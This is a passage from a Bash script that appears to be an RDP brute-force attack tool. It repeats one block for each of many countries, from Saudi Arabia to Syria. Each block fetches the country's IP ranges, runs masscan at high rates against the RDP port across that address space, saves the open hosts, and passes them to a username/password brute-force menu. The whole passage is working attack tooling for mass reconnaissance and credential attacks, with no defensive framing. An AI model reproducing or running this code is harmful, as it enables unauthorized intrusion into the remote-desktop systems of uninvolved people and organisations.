echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "161" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAUDI+ARABIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Saudi Arabia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "162" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SENEGAL|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Senegal://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "163" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SERBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Serbia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "164" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SEYCHELLES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Seychelles://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "165" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SIERRA+LEONE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Sierra Leone://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "166" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SINGAPORE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Singapore://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "167" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SLOVAKIA+%28SLOVAK+REPUBLIC%29 |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Slovakia (SLOVAK Republic)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "168" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SLOVENIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Slovenia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "169" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SOLOMON+ISLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Solomon Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "170" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SOUTH+AFRICA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/South Africa://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "171" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SPAIN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Spain://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "172" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SRI+LANKA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Sri Lanka://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "173" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SOUTH+SUDAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/South Sudan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "174" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SURINAME |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Suriname://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "175" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SWAZILAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Swaziland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "176" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SWEDEN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Sweden://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "177" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SWITZERLAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Switzerland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "178" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SYRIAN+ARAB+REPUBLIC |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Syrian Arab Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
